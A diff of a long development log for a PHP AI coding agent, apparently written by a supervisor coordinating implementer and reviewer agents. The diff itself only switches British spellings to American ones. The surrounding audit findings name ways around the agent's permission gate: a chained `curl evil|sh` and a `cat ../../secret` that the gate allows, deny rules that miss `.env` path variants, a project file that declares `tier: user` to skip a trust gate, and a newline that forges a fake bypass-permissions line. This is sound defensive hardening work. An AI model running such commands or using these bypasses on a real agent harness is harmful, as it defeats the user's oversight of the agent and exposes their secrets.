@@ -6613,7 +6613,7 @@ match nothing. Telling the model it had ERE would have made every alternation an
 grouping pattern it wrote silently wrong. Later refined to **GNU** basic rather than
 POSIX basic, because `\|`, `\+`, `\?` are GNU extensions — strict POSIX BRE has no
 alternation operator at all. Now consistent across `description()`, `inputSchema()`
-and a behavioural test; adding `-E` reds three tests. Environment note: an
+and a behavioral test; adding `-E` reds three tests. Environment note: an
 interactive shell here may alias `grep` to `ugrep`, so `grep --version` misreports —
 probe via `sh -c 'command -v grep'`.
 
@@ -6654,7 +6654,7 @@ property of a different thing — and all three landed in text the model reads a
 - **The `architect` preset claimed "you have read-only tools".** It has none:
   `defaultTools` never filters anything and `AgentManager::executeSubAgent()` builds
   its request with no `tools` field. Reworded to state its method. **Correction to the
-  supervisor's own brief:** `defaultTools` is not merely copied and serialised —
+  supervisor's own brief:** `defaultTools` is not merely copied and serialized —
   `AgentsCommand.php:132` **prints the roster to the operator**, so it displays a
   containment the runtime does not provide. Worse than "inert"; filed as ledger §C7.
 
@@ -6665,7 +6665,7 @@ FALSE while keeping its keywords.** The suite had power over whether a clause wa
 present and none over whether it was true — which is exactly why a green 6872 said
 nothing about the three defects above.
 
-Factual clauses are now pinned behaviourally in both directions. The `Grep`
+Factual clauses are now pinned behaviorally in both directions. The `Grep`
 skip-annotation depth is **not written down at all**: the test plants `vendor/` at
 five depths, measures the deepest level still announced (3) and the shallowest that
 goes silent (4), then requires the prompt's stated figure to equal the measurement —
@@ -6779,7 +6779,7 @@ passed on all four of the agent's full runs and on mine; untouched.
 exits 0, no per-lib lock, none of the forbidden files touched. 15 mutations applied,
 15 killed.
 
-### The offline path's tiers were all switched off, and the fix was a behaviour change
+### The offline path's tiers were all switched off, and the fix was a behavior change
 
 `EchoProvider::contextWindow()` answered `1_000_000` — a stand-in for "unlimited"
 written while the method had zero readers. Once item 4 made it the compaction
@@ -6882,7 +6882,7 @@ the label beside it, compare against an independently measured value, and assert
 two differ so a swap is visible. The unit-flip mutation that survived last round is
 killed.
 
-The escapes are pinned **behaviourally** — every slash command the refusal names is
+The escapes are pinned **behaviorally** — every slash command the refusal names is
 extracted, submitted on the refused chat, and the turn retried, asserting which
 actually unblock. That is how two review claims were found wrong: **`/fork` is not an
 escape** (it spawns a background session and leaves this history in place; without a
@@ -7144,7 +7144,7 @@ presence check.
   already 16 columns over. Needs its own bundle; filed as functionality precisely so
   the end-of-plan security pass does not swallow it.
 - **E23 (new)** — `exchangeKey()`'s "harmless" clause about duplicate-content
-  exchanges is a judgement standing where a measurement should be. 21 byte-identical
+  exchanges is a judgment standing where a measurement should be. 21 byte-identical
   exchanges collapse onto one key and 20 summary lines are discarded;
   `testTwoIdenticalExchangesShareOneKey` asserts the collision, not the harmlessness.
 - **E24 (new)** — nothing guards a future provider that reports cumulative rather than
@@ -7216,7 +7216,7 @@ Fixed by adding `CompleteResponse::$errorTransient`, classified **at the catch s
 while the live exception still exists**, rather than re-derived later by
 pattern-matching `$e->getMessage()` prose. `null` means UNCLASSIFIED and is treated as
 permanent — `TransientFailure::responseIsTransient()` requires an explicit `true`, so
-the allow-list rule that governs unrecognised exceptions governs unrecognised error
+the allow-list rule that governs unrecognized exceptions governs unrecognized error
 responses too.
 
 ### Item 8: the streaming gate is sharper than the one I specified
@@ -7237,7 +7237,7 @@ numbers drive a spend cap. A retry re-entering the loop without clearing it woul
 double-charge a session against its own ceiling. ("All four" is exactly the kind of
 figure this chain gets wrong; the review was asked to count them independently.)
 
-Standing constraint honoured: nothing re-enables a provider SDK's own retry, and no
+Standing constraint honored: nothing re-enables a provider SDK's own retry, and no
 blanket total-request timeout was introduced. `VertexProvider.php:1190-1230` documents
 that **both** `RetrySettings` timeout fields were deliberately zeroed to stop
 `RetryMiddleware` imposing an RPC deadline; that block is load-bearing and untouched.
@@ -7257,9 +7257,9 @@ notes are standing convention; a query-matched subset is a different feature. Ow
 `<project-memory>` fence rather than reusing `<project-instructions>`. Bounded to 12
 entries / 4096 bytes of note text / 512 bytes per note, with the prompt's stated limits
 interpolated from the constants that enforce them (the B2 technique: one number, so
-instruction and enforcement cannot drift). Rejected: per-term tokenised ranking.
+instruction and enforcement cannot drift). Rejected: per-term tokenized ranking.
 
-`MemoryScope::Local` normalises to the on-disk scope **`agent`** — the enum's values
+`MemoryScope::Local` normalizes to the on-disk scope **`agent`** — the enum's values
 (`user`/`project`/`local`) are not the directory names. My brief asserted they were.
 
 ### Item 10a: the second line has no data source, and was correctly not faked
@@ -7380,7 +7380,7 @@ bounded; `clip()` pays for its truncation marker out of `MAX_ENTRY_BYTES` so a c
 lands *on* the ceiling rather than at ceiling+13; the first-entry exemption is gone.
 
 **The fix agent flagged its own honest gap rather than claiming coverage:** removing the
-exemption is now behaviourally unobservable, because the per-line clip plus
+exemption is now behaviorally unobservable, because the per-line clip plus
 `MAX_ENTRY_BYTES ≤ MAX_BYTES` means the first note always fits. It pinned the inequality
 that makes that safe instead of writing a test that pretends to cover the exemption. That
 is the right answer and the right way to report it.
@@ -7538,7 +7538,7 @@ in the fix round.
    *before* the tier block, so an over-85% prompt in a capped session is refused outright and
    the tier never runs (measured: `sumCalls=0`, `cmd=null`, draft kept). There is no
    "compacts on the heuristic, says so, and dispatches the turn" to build. A
-   `spendCapReached()` gate stayed inside `scheduleParkedCompaction()` as defence — the gate
+   `spendCapReached()` gate stayed inside `scheduleParkedCompaction()` as defense — the gate
    belongs to the provider call, not to the caller's ordering — returning null, not a notice.
 2. **"`/clear`, `/rewind` and New session during the parked window" is not drivable.** With
    `inFlight === true`, `update()` swallows every keystroke except Ctrl+C and Escape; Ctrl+P
@@ -7576,8 +7576,8 @@ in the fix round.
 
 ### Three further findings recorded, not fixed
 
-- A parked summarization **cannot be cancelled at the provider**, only locally: no
-  `CancellationToken` is threaded into `completeAsync()`, so a cancelled parked turn is still
+- A parked summarization **cannot be canceled at the provider**, only locally: no
+  `CancellationToken` is threaded into `completeAsync()`, so a canceled parked turn is still
   billed for the summary (`update()` accounts usage ahead of the latch check, deliberately).
   Pre-existing for `/compact`; now it also gates a submitted turn.
 - A **hung summary provider** leaves the parked window open with only Ctrl+C / double-Escape
@@ -7655,7 +7655,7 @@ history) · `M42` (the `''`-means-already-echoed convention, whose comment also 
 the failure as "two copies of one prompt" when it is a stray empty user line) · `M47`
 ("still billed because usage is accounted ahead of the latch check" was asserted in prose
 only) · `M12`/`M13`/`M30` (belt-and-braces keys with no reader). `M08`, the dormant spend-cap
-gate, is now labelled unasserted defence in words, with backlog E31 for its shape.
+gate, is now labeled unasserted defense in words, with backlog E31 for its shape.
 
 #### Six more corrections to the supervisor's brief
 
@@ -7677,7 +7677,7 @@ gate, is now labelled unasserted defence in words, with backlog E31 for its shap
    carrying an app notice directly after a user turn — because the compactor no longer erases
    it. Intended, and the bundle's own offline test still passes unchanged.
 
-Also: my fix brief told the agent to report on C1–C11 while only labelling some of them, so
+Also: my fix brief told the agent to report on C1–C11 while only labeling some of them, so
 two labels (C5, C8) appeared in the instruction and nowhere in the content. Number the
 findings once and keep the numbering.
 
@@ -7685,8 +7685,8 @@ findings once and keep the numbering.
 
 New **E31** (the dormant cap gate answers null where `/compact` answers with a notice, so a
 future ordering change would silently pick the lossier path) · **E32** (a parked summarization
-cannot be cancelled at the provider — `completeAsync()` takes no `CancellationToken` and
-`inFlightCancellation?->cancel()` is a no-op on null, so a cancelled parked turn pays for the
+cannot be canceled at the provider — `completeAsync()` takes no `CancellationToken` and
+`inFlightCancellation?->cancel()` is a no-op on null, so a canceled parked turn pays for the
 summary in full; policy attached: short `connect_timeout` only, never a total-request timeout)
 · **E33** (the 70% reminder is committed to permanent history every turn — newly *visible*
 because compaction no longer erases the copies; 20-turn measurement included). Amended
@@ -7769,7 +7769,7 @@ Re-measured table, on this tree:
   must not itself fatal — the same reason the bundle had just removed `SIGTERM` from that path.
 - **`CommandBackend` returned an EMPTY answer whenever the whole reply was `0`.**
   `stream_get_contents(...) ?: ''` treats `"0"` as falsy. Pre-existing; in scope because the
-  bundle newly promoted the surrounding behaviour to a documented absolute ("STDOUT IS
+  bundle newly promoted the surrounding behavior to a documented absolute ("STDOUT IS
   RETURNED VERBATIM", which `trim()` also falsifies for an indented first line).
 
 Plus: tokens are emitted per LINE rather than per read, which fixed a correctness bug and not
@@ -7780,13 +7780,13 @@ read boundary landed on the `\r`. The implementer's report had called this
 The `bypass_shell` ternary whose two arms were identical (`is_array($c) ? $c : $c`) is gone
 from BOTH backends. Its replacement had justified a list-only branch with a Windows story that
 contradicted `CommandBackend`'s identical promise, in a diff whose own docblock insisted "the
-shell-out tier's two halves must not disagree" — and both the new behaviour AND its exact
+shell-out tier's two halves must not disagree" — and both the new behavior AND its exact
 inverse survived the targeted test file. Settled by measurement: `["printf","a;b"]` prints
 `a;b`, so the array form bypasses the shell BY CONSTRUCTION and the option is redundant, not
 load-bearing. Note relative to the previous HEAD, neither shape gets it now.
 
 Whitespace-only values count as absent on both variables instead of spawning `sh -c '   '` and
-labelling the run `command` so nothing warns. Deliberate change to tier 2, whose brief said
+labeling the run `command` so nothing warns. Deliberate change to tier 2, whose brief said
 "keep tier 2 byte-identical" — the invariant meant its protocol and stdin payload, not its
 degenerate selection edge case.
 
@@ -7854,7 +7854,7 @@ exists).
 4. **My M11 instruction contradicted itself** across two sections and never defined the
    mutation string. Round A correctly refused to guess and substituted the clock mutation,
    reporting it as such.
-5. **My "never judge green from a directory-scoped run" over-generalised.** The DIRECTORY
+5. **My "never judge green from a directory-scoped run" over-generalized.** The DIRECTORY
    `vendor/bin/phpunit tests/Cli` hangs (>4min); a single FILE inside it runs in 0.054s at
    rc 0, and `--filter` against a single file is ~0.02s. The blanket warning was discouraging
    the only affordable mutation harness in this suite. Recorded in RESUME §8.
@@ -7875,7 +7875,7 @@ exists).
     `.candy-code/config.json`; `candy-code/.candy-code/config.json` is a different file with
     a different md5 and is not tracked by git at all.
 
-And one prediction of mine that was simply wrong in the bundle's favour: I expected the
+And one prediction of mine that was simply wrong in the bundle's favor: I expected the
 "Measured on this tree" table in the class docblock to be a figure copied from a reasoned
 expectation. The reviewer re-ran both rows and confirmed them byte for byte. It was the one
 place in the bundle where a table had actually been measured.
@@ -7923,7 +7923,7 @@ Two things settled by measurement before briefing, so no agent had to re-derive 
 **not append-only** (`Chat.php` rewrites it wholesale on the tool-result splice twice, `/clear`,
 every compaction tier, and `/rewind`), and `dispatchTurn()` checkpoints
 `'messages' => $next->history`, so checkpoints inherit whatever shape wins with no second
-serialisation site.
+serialization site.
 
 ### What the review found that I had not thought to look for
 
@@ -7941,7 +7941,7 @@ report and `_Permission denied_` — precisely the E21 victims.
 Fixed with a `'system'` arm. **Zero existing test expectations moved**, so the stop condition I
 attached (stop if more than ~5 fixtures move; the split is my call) never engaged — I
 over-forecast the blast radius. The `tool` case stays coerced **by necessity, not by choice**:
-`Role` is a three-case enum with no `tool` case and nothing in the app serialises one, so such a
+`Role` is a three-case enum with no `tool` case and nothing in the app serializes one, so such a
 row exists only as a hand-built fixture. My brief had told the fixer "if reviving `tool` rows
 properly blows the budget, report it as still open" — that instruction assumed an option that
 does not exist.
@@ -7973,7 +7973,7 @@ explicitly, to stop a later reviewer re-raising it.
 
 - The comment claimed the quoted figure **overstates** the committed history by the dropped
   copy's 53 tokens. Measured: committed is **N+65** on the first fire and **N+12** after, because
-  the dropped copy is cancelled by the fresh one appended in the same breath. Magnitude right,
+  the dropped copy is canceled by the fresh one appended in the same breath. Magnitude right,
   verb and referent wrong — 53 is true only of post-strip `$baseHistory` in isolation, an array
   never committed on its own.
 - `groupIntoPairs()`'s docblock had downgraded E21's 10-exchanges-to-0 measurement to "loses one
@@ -8105,7 +8105,7 @@ hooks, which is a silent widening of a security grant.
   costs "the ability to address the second tool, **not** a call sent to the wrong server's tool of
   a different name" — true, and it conceals a call sent to the wrong server's tool of the SAME
   name.
-- **A nested `properties: []` from any MCP server 400s the entire request.** Both normalisation
+- **A nested `properties: []` from any MCP server 400s the entire request.** Both normalization
   layers are root-only. By `ToolSchema`'s own docblock this is not scoped to one tool: "the whole
   `chat/completions` request 400s, so a single parameter-less tool makes the agent unable to send
   ANY message." A nested no-argument object is a routine MCP schema, and this bundle is the first
@@ -8127,7 +8127,7 @@ threaded through `request()`/`readResponse()`/`readLine()`.
     direct child  sh -c '/usr/bin/php' '…/stubborn.php'   -> dead after stop
     grandchild    /usr/bin/php …/stubborn.php             -> ALIVE, PPID 1
 
-The escalation never engages because dash honours SIGTERM instantly, and in another probe the
+The escalation never engages because dash honors SIGTERM instantly, and in another probe the
 killed wrapper's grandchild was **still answering `tools/call` over the inherited pipes** — a
 "stopped" server that keeps serving. The fix is smaller than documenting it: pass `proc_open()` the
 ARRAY form, so the direct child IS the server and the escalation lands where it was meant to. That
@@ -8146,11 +8146,11 @@ hyphens are ubiquitous in real MCP keys). The fifth is genuinely dead code.
 
 1. **My entire §2 safety argument answered the wrong question** — see above. The most consequential
    brief error of the session.
-2. **"Two MCP tools sanitising to the same name is the case I most want measured"** — right
+2. **"Two MCP tools sanitizing to the same name is the case I most want measured"** — right
    mechanism, wrong precondition, and chasing it specifically would have MISSED the real bug. No
-   sanitisation collision is needed; mis-routing fires whenever two servers share a tool name.
-3. **"A server or tool name that sanitises into something without the `mcp__` prefix"** —
-   impossible. The prefix is prepended unconditionally and never sanitised, so a bridge can never
+   sanitization collision is needed; mis-routing fires whenever two servers share a tool name.
+3. **"A server or tool name that sanitizes into something without the `mcp__` prefix"** —
+   impossible. The prefix is prepended unconditionally and never sanitized, so a bridge can never
    shadow a built-in.
 4. **"`chat($repoA)` then `chat($repoB)` in one process is a supported shape (the tests do it)"** —
    the tests do NOT do it. No test drives two roots, which is why the memoization mutations survive.
@@ -8165,7 +8165,7 @@ hyphens are ubiquitous in real MCP keys). The fifth is genuinely dead code.
    added to `src/` reds two tests and names it. Only the deliberate one-line exemption is
    unguarded.
 8. **My "the adapter is thin" was right about the field mapping and wrong about the work** — three
-   fields need normalising before a provider accepts them.
+   fields need normalizing before a provider accepts them.
 9. **My trap-fixture rule was right for the wrong reason.** The `sh -c` wrapper is the direct child
    for EVERY string command on this host, script file or not, because dash does not exec-optimise.
 10. **Containment is not where the security problem is.** Every attack I listed behaves correctly
@@ -8284,7 +8284,7 @@ figure a reader actually wants is **EIGHT** repository-chosen paths feeding that
 just written: a test now pins that `.mcp.json` is absent from the derivation, present backticked
 where the counts are stated, and that the `DOT-DIRECTORY` qualifier is there.
 
-**The `error_log()` diagnostic was asserted rather than silenced.** It honours the `error_log` ini
+**The `error_log()` diagnostic was asserted rather than silenced.** It honors the `error_log` ini
 setting, which makes it the one stderr write in that class a test can observe, so the test points it
 at a file and asserts the message. Kept and checked beats quiet.
 
@@ -8454,7 +8454,7 @@ line is just the next paragraph.
 
 **This is §5 again, and it is mine.** My 204-column measurement was real — but it was taken against
 standalone `Chat::view()`, and I wrote it next to the hosted `bin/candy-code` path. A number that
-travelled without its domain, in the brief whose job was to carry ground truth.
+traveled without its domain, in the brief whose job was to carry ground truth.
 
 Worse: **the user's own words were "not wrapped but cut off".** Cut off IS truncation. They described
 the mechanism correctly and I replaced their description with a theory. The fix is the same either way,
@@ -8470,7 +8470,7 @@ my measurement and both of us have now been wrong once.
    terminal, and the status bar is documented as the one line this renderer never truncates (narrowest
    54 idle / 36 in flight, already pinned by `StatusBarSpendTest`). The test states both in its class
    docblock and asserts the floor as a BOUND (26, against 180-406 unfixed) rather than exempting it.
-2. **Hazard 3 was inverted.** An unbalanced row does not bleed colour downward — the shell's border
+2. **Hazard 3 was inverted.** An unbalanced row does not bleed color downward — the shell's border
    closes every row with a reset — so dropping `balanceSgr()` shows up as continuation rows LOSING
    their styling. The consequence is sharper than the correction: **a `SgrState::isDefault()` per-row
    assertion is VACUOUS on this frame, passing with and without the rebalance**, and the implementer's
@@ -8656,7 +8656,7 @@ mutations entirely** — round A's MU11 was "renderHistory wrapWidth halved" whe
 | MU28 `:2495` `max(8, min(IMAGE_COLS, $width))` → `max(8, IMAGE_COLS)` | KILLED |
 
 **"All eleven die" was true of round A's reconstructions and false of the reviewer's mutations.** A claim
-that travelled without its domain — here the domain being *which edit the name denotes* — in a report
+that traveled without its domain — here the domain being *which edit the name denotes* — in a report
 whose entire purpose was to certify that the mutations were dead. Twenty-eighth round.
 
 **And the reason those four resist is itself worth recording, because it is not laziness.** All of
@@ -8941,7 +8941,7 @@ Both implementers reported all their own mutations killed. Both were wrong.
   0-based)`: survived four test files, because only `description()` was pinned and the schema —
   the text the model actually reads per argument — was pinned nowhere.
 - **C4b implementer: 8/8 killed. Reviewer derived 7 and 6 SURVIVED.** One survivor was an
-  exploit: honouring a frontmatter `tier:` line lets a project `review.md` declare `tier: user`
+  exploit: honoring a frontmatter `tier:` line lets a project `review.md` declare `tier: user`
   and, under `projectCommandsTrusted: false`, **create the marker with the gate bypassed** —
   an attack `fromFile()`'s own docblock names, with zero test behind it. Another hardcoded
   `projectCommandsTrusted: true` and survived, because nothing outside the new test file
@@ -8983,7 +8983,7 @@ form reached the output, no marker created.
 
 - **A fix can strand its own sibling outside the reach of any test.** Once C6's `fileUri()`
   encoded, `%2B` decoded identically under `urldecode` and `rawurldecode` — so reverting the
-  decoder passed **all 37** tool-level tests. The agent measured that, recognised the tool could
+  decoder passed **all 37** tool-level tests. The agent measured that, recognized the tool could
   no longer distinguish them, and added the test one level down at `LspClient` where `$uri` is a
   public argument. Mutation then died.
 - **Both fix agents caught vacuity in their own drafts.** C6's symbols cursor-independence probe
@@ -9106,7 +9106,7 @@ key** (`Subcommands.php:423`'s `$config['model']` is a *provider* config), while
 were omitted. The lane covered the 8 real keys and **declined to add `model`**, because a key
 nothing reads looks configurable and is inert.
 
-### Design judgement worth preserving from the settings work
+### Design judgment worth preserving from the settings work
 
 - **The user's files outrank the project's** — the reverse of the editor convention, because the
   project layer arrived with a clone. "A project fills in what you left unsaid; it never overrules a
@@ -9204,7 +9204,7 @@ the commit recipe says `git pull --rebase` **always** rather than "when you expe
   guard was untestable belt-and-braces; the lane measured that **`realpath('')` on PHP 8.3.6 returns
   the process CWD, not `false`**, so without the guard `projectSettingsTrusted('')` would put the
   trust question to whatever directory the shell happened to be standing in. Same conclusion as the
-  review (no behaviour change today), opposite *reason*, and the reason is what makes the guard worth
+  review (no behavior change today), opposite *reason*, and the reason is what makes the guard worth
   keeping. It then pinned it.
 - **It narrowed a census verdict word on its own initiative** — `CONTAINED` → `CALLER_SUPPLIED` for
   `LayeredSettings|file_get_contents`, because `CONTAINED` is true of `projectLayer()`'s caller and
@@ -9277,7 +9277,7 @@ accessors) are two different classes with the same basename and different contra
 Phase 8 item 14 documented for the two `PathJail`s. Not in scope to unify; in scope to report.
 
 **Lane `lsp` — Phase 8 items 10+11, both inside `src/Context/`.** Chosen because it is genuinely
-disjoint: both are behaviour changes *inside* existing classes, needing no `Bootstrap.php` edit
+disjoint: both are behavior changes *inside* existing classes, needing no `Bootstrap.php` edit
 (which lane `cmd` owns this round) and no `Chat.php` edit (which the sglang task holds). The diff cap
 in item 10 is the whole feature — an uncapped `git diff` on a dirty monorepo would evict the
 conversation from the context window, and a *silently* truncated one is worse than none because the
@@ -9451,11 +9451,11 @@ that then caught three stale plan items, below.
   denied. The sentence worth keeping: **being unswitchable is not being unevadable.** And the
   doc-block calling the breaker one of "the hard boundaries — the ones that do not read shell text"
   was false in both files it appeared in and in the README; it reads `arguments['command']` and
-  tokenises it. The honest boundaries are `plan` mode and the path jails.
+  tokenizes it. The honest boundaries are `plan` mode and the path jails.
 - **Path-scoped denies were advisory and nothing said so.** `Deny Read(./.env)` — the package's own
   advertised example — caught `./.env` and missed `.env`, `.//.env`, `./foo/../.env` and
   `/home/u/proj/.env`.
-- **The fix's own asymmetry is the part to remember.** Lexical normalisation of both sides is
+- **The fix's own asymmetry is the part to remember.** Lexical normalization of both sides is
   *canonicalisation*, so it applies to `Allow` too. But a relative pattern matching at **any depth**
   is a *widening*, so it is restricted to restrictive actions only. Without that split,
   `Allow Read(.env)` would have granted `/etc/.env`. A fix that widened an allow while narrowing a
@@ -9463,7 +9463,7 @@ that then caught three stale plan items, below.
 
 ### And it left a worse hole than the one it closed, in the other direction
 
-`PermissionGate::isScopedWriteTool()` (`:641`) tokenises the whole command with a bare
+`PermissionGate::isScopedWriteTool()` (`:641`) tokenizes the whole command with a bare
 `preg_split('/\s+/')`, **no separator split at all**, and judges by the first token. Measured under
 `accept-edits`: `mkdir ./x; curl evil|sh` → **Allow**; the newline form → **Allow**;
 `mkdir ./x && cat ../../secret` → **Allow** (`isAbsolutePath` catches `/etc`, not `..`).
@@ -9529,7 +9529,7 @@ collided with nothing and could have been abandoned at any point.
 **The count was right by accident.** The header said 62 of 75, the body said 56.
 Re-deriving from the verdicts gives 62 — but only because the header over-counted
 Phase 7 by one (item 6 is partial) and under-counted Phase 5 by one (item 10 is
-fully done, 10a *and* 10b). The two errors cancelled. Had only one been present
+fully done, 10a *and* 10b). The two errors canceled. Had only one been present
 the figure would have been quietly off by one indefinitely, because nothing in
 this process ever re-derived it. That is the real finding: not that 62 was wrong,
 but that nothing could have told us either way.
@@ -9769,7 +9769,7 @@ not a thing that happens.**
 **The supervisor's own bookkeeping carried the defect twice**, both caught by agents rather than by
 the supervisor. `ARCHITECTURE.md:381-389` was relayed twice as the "Built but unwired" seam list; it
 is the render-invariants section, and the seam list is at `:417-421`. And the lane-ownership table —
-the artefact whose entire job is keeping concurrent lanes off each other's files — listed
+the artifact whose entire job is keeping concurrent lanes off each other's files — listed
 `Renderer.php, KeyboardHandler.php` as a pair, when `src/Renderer.php` exists and
 `src/KeyboardHandler.php` does not. No lane was misrouted, because the real file sits inside the
 `src/Tui/**` the table already granted. **Rule: re-open the file at the line range before repeating
@@ -9800,7 +9800,7 @@ return `true`, so it contrasted `Grep` against two tools that do not contrast.
 **Both premises the supervisor handed that lane were wrong, and the lane measured rather than worked
 around them.** `Write`'s `instructionLoader` IS guarded by a test that predates the change; the
 unguarded half was the `skillNudge`, and dropping it moves **not one assertion** across 376 tests.
-"`Write` is constructed apart from the other three" was an artefact of reading one array literal as
+"`Write` is constructed apart from the other three" was an artifact of reading one array literal as
 two — the only thing between `Glob` and `Write` was the unwired `new Grep($root)`.
 
 **P8.4 — the compositor was wired to a map its own producer never writes.** The implement report was
@@ -9882,7 +9882,7 @@ sources carries all sixteen fields AND keeps the bound unrepresentable. Taken, a
 
 **A stated justification is a claim, and claims get measured.** `disabledTools` is project-settable
 while `allowedTools` is user-tier-only, justified in both a doc page and the source comment by: a deny
-list can only express the attack by naming every tool it removes. `fnmatch()` honours negated
+list can only express the attack by naming every tool it removes. `fnmatch()` honors negated
 character classes. A project-tier `{"disabledTools":["[!B]*"]}` leaves exactly `Bash`. Recorded as
 E57.
 
@@ -9926,15 +9926,15 @@ took the manifest read outside the checkout and put a foreign package's descript
 prompt of the session. Three sentences in the same commit asserted this was impossible, all reasoning
 about the path string rather than what it resolves to.
 
-**A guard test written from the sanitiser's byte class tests the sanitiser, not the surface.**
-`/permissions` sanitised its fields and still let a newline in a rule pattern forge whole report lines
+**A guard test written from the sanitizer's byte class tests the sanitizer, not the surface.**
+`/permissions` sanitized its fields and still let a newline in a rule pattern forge whole report lines
 — including a fake `Permission mode: bypass-permissions` under a gate that was `Default`. Its guard
 asserted a byte class that was a strict subset of what `Sanitize::untrusted()` already strips. Write
 the guard from the property the surface needs (*this report has exactly the lines the renderer
 intended*), not from the residue.
 
 **The pattern across both: each lane did real security work and left a hole immediately beside it.**
-One gated the values and not the walk; the other sanitised the bytes and not the structure. Ask what
+One gated the values and not the walk; the other sanitized the bytes and not the structure. Ask what
 the surface guarantees, not what the helper strips.
 
 **Anchoring the claims is useless if choosing which to anchor is possible.** Three of six permission
@@ -9949,7 +9949,7 @@ isolated assertions were the whole delta. They weren't: the commit added a row t
 pre-existing assertions iterate.
 
 **Fix agents should be told the reviewer can be wrong, and it pays.** Both fix agents this round
-refuted or corrected a finding by measurement, and one retracted its own earlier defence of a mutation
+refuted or corrected a finding by measurement, and one retracted its own earlier defense of a mutation
 survivor unprompted. A fix brief that presents review findings as gospel loses that.
 
 ## Round 36 — the two blocking shell-out backends, and the split pane that was invisible for two reasons
@@ -9992,7 +9992,7 @@ the same lane's other three corrections were right, which is exactly what makes 
 recommending a pattern they in fact refute. I relayed it without checking, one message after writing
 the rule above.
 
-**Sweep the behaviour, not the token.** The fifth stale doc site was a parenthetical no `#79` grep
+**Sweep the behavior, not the token.** The fifth stale doc site was a parenthetical no `#79` grep
 would ever hit.
 
 **A benchmark must measure what the code does.** A reviewer's `json_encode` figure was reproducible
@@ -10062,7 +10062,7 @@ Same verdict, and only the second version survives a caller that does not exist 
 
 **A fixture can be shaped like the property instead of the bug.** `sglang`'s all-zones sweep covered
 `keyHelp`/`prompt`/`picker` and excluded the **palette** — the one state with a non-trivial rule — so
-widening its whitelist prefix to `'p'` was a behavioural mutation the full suite passed.
+widening its whitelist prefix to `'p'` was a behavioral mutation the full suite passed.
 
 **The trigger dimension is not always the obvious one.** Many files per directory does *not* reproduce
 the cap blowup; many directories with few files each does. Three agents measured the wrong axis first.
@@ -10142,7 +10142,7 @@ explicitly that its working tree is its own work and not something to "clean up"
 (pre-existing, masked by `clipWidth()`, now measured across ten widths). E54 is stamped **PARTIALLY
 FIXED**, not FIXED: the `+4` is single-sourced and the dashboard over-run is gone, but the below-44 case
 named in its own heading is untouched. `CHROME_WIDTH`'s docblock and the new geometry test now document
-a known over-run as current behaviour, so both must be updated the day E64 is fixed — said so in E64's Step.
+a known over-run as current behavior, so both must be updated the day E64 is fixed — said so in E64's Step.
 
 ---
 
@@ -10238,7 +10238,7 @@ cannot recur.
 - **`lsp` — E68 + E69.** Both are the same question — `candy-core`'s `Width` disagreeing with the <!-- @rename-keep historical provenance -->
   renderer that consumes it — so splitting them would have put two lanes in one file.
 - **`sglang` — the launch-notice migration.** Sole holder of `src/Cli/Bootstrap.php` and `src/Chat.php`,
-  this plan's serialisation bottleneck.
+  this plan's serialization bottleneck.
 
 ### Two supervisor-measured corrections, made BEFORE briefing
 
@@ -10298,7 +10298,7 @@ measurement. Mark it as a hypothesis or have it settled before it is quoted.*
 - **Round 41's clean shape: E52 + E61(S) + statusLine.** Only `statusLine` needs `Bootstrap.php` *and*
   `Chat.php`. Adding E59 is safe **only** if its lane is told to extend the stdin `startup` payload
   rather than the `ProcessExecutor` constructor — otherwise E59 and `statusLine` both open `Chat.php`
-  and must be serialised.
+  and must be serialized.
 
 ### What landed — all three lanes, supervisor-verified in the live tree
 
@@ -10679,12 +10679,12 @@ has to be *explained*, and `grep -c '^+ *yield '` turned out to be the cheap way
 ### Lane a — E85 + E87, the skills subsystem. 15 commits, `ad51a740`.
 
 **E85 replaced the three hand-rolled `str_replace` rewrites with a real pattern→regex translation**, and
-the fix is a **live, user-visible behaviour change**: three of the four shipped skills
+the fix is a **live, user-visible behavior change**: three of the four shipped skills
 (`php-best-practices`, `security-audit`, `phpunit-master`) declare a leading-`**` pattern, and a leading
 `**` matched none of the three old rewrites. Verified independently by the supervisor after the merge:
 `**/*.php` against `foo.php` is **0** under bare `fnmatch()` and **1** now; `**/*Test.php` against
 `FooTest.php` likewise. Those three skills previously never fired on a tree-root file. That is what the
-author plainly intended, which is why it ships — but it is a behaviour change and nothing user-facing
+author plainly intended, which is why it ships — but it is a behavior change and nothing user-facing
 says so, which is E90.
 
 🔴 **THE ROUND'S MOST VALUABLE FINDING WAS THE LANE REFUTING ITS OWN DEFERRAL.** The lane, its reviewer
@@ -10772,7 +10772,7 @@ spelled `--output-format=…`. The comment says outright that the alignment is u
 ### Lane c — E81 + E82 + E83 + E89, doc and test truth. 10 commits, `9eebe204`.
 
 **The census moved off regex and onto the token stream.** The `onConfigChange` key census now walks
-`token_get_all()`, recognises both PHP closure-property call shapes (`?->__invoke(...)` and
+`token_get_all()`, recognizes both PHP closure-property call shapes (`?->__invoke(...)` and
 `($this->onConfigChange)(...)`), and — the important part — records a non-literal argument as
 `<not a literal>` rather than skipping it: **a call the census cannot read must red, not vanish.** A new
 test refuses the two routes a token walk cannot follow (`call_user_func`, assignment to a local), turning
@@ -10839,7 +10839,7 @@ the backlog**, which every lane appends to and which is expected to conflict. Ze
 
 **PHP 8.4 was not exercised.** This box has only 8.3.6; CI runs 8.3 **and** 8.4. Lane c flagged the one
 thing in its diff whose token stream has only been observed on 8.3.6: `token_get_all()`'s emission for
-the parenthesised-closure-call shape. Lane a's whole `fnmatch`/PCRE translation is stdlib-behaviour work
+the parenthesised-closure-call shape. Lane a's whole `fnmatch`/PCRE translation is stdlib-behavior work
 and carries the same caveat, though PCRE semantics are the stable half.
 
 ## ROUND 44 — three new oracles, a census that would have passed while broken, and the discovery that assertion counts are not additive
@@ -10879,7 +10879,7 @@ worktree is not a fact about master.
 
 E103 emptied the stale-figure census. **An empty census is a weaker guard than a census of one**, because
 an assertion of `[]` also passes in a tree where the scanner has quietly stopped working. The brief said
-so; lane a built the defence; the supervisor mutated the scanner to never match and measured both halves:
+so; lane a built the defense; the supervisor mutated the scanner to never match and measured both halves:
 
 - `testNothingInScopeStillCarriesTheStaleFigureAndTheSettingsPageAgrees` — **PASSES**, 1 test, 18,228
   assertions, entirely green, in a tree where the instrument is dead.
@@ -10984,7 +10984,7 @@ concrete negative the same paragraph explains away.**
 **E96's fix is identity, not window.** `ToolIpcFiles::strandedReservations()` attributes in the PARENT,
 which is the only place identity exists, and the detector keeps a control — an empty stranded list means
 "nothing leaked" only if something was reserved. ⚠️ **Lane c refuted its own preferred fix first:** on PHP
-8.3.6 `sys_get_temp_dir()` resolves and **caches on first use** and does not honour a runtime
